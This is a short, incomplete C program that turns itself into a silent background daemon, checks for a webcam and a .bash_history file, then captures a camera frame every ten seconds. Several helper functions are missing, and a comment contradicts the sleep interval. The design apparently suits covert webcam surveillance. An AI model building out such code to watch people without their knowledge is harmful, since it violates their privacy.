#include <sys/stat.h>
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <errno.h>
#include <unistd.h>
#include <syslog.h>
#include <string.h>


int main(void) {
	/* Our process ID and Session ID */
	pid_t pid;
	pid_t sid;
	FILE *fp = NULL;

	if (!check_camera()) {
		printf("/dev/video0 not found\n");
		exit(EXIT_FAILURE);
	}

	if (!check_history_file()) {
		printf(".bash_history not found\n");
		exit(EXIT_FAILURE);
	}

	/* Fork off the parent process */
	pid = fork();
	if (pid < 0) {
		exit(EXIT_FAILURE);
	}
	/* If we got a good PID, then
	   we can exit the parent process. */
	if (pid > 0) {
		exit(EXIT_SUCCESS);
	}

	/* Change the file mode mask */
	umask(0);

	/* Open any logs here */

	/* Create a new SID for the child process */
	sid = setsid();
	if (sid < 0) {
		/* Log the failure */
		exit(EXIT_FAILURE);
	}

	/* Change the current working directory */
	if ((chdir("/")) < 0) {
		/* Log the failure */
		exit(EXIT_FAILURE);
	}

	/* Close out the standard file descriptors */
	close(STDIN_FILENO);
	close(STDOUT_FILENO);
	close(STDERR_FILENO);

	/* Daemon-specific initialization goes here */

	/* The Big Loop */
	fp = fopen ("Log.txt", "w+");
	while (1) {
		/* Do some task here ... */

		sleep(10); /* wait 30 seconds */
		fprintf(fp, "Logging info...\n");
		fflush(fp);

		capture_frame();
	}
	fclose(fp);
	exit(EXIT_SUCCESS);
}
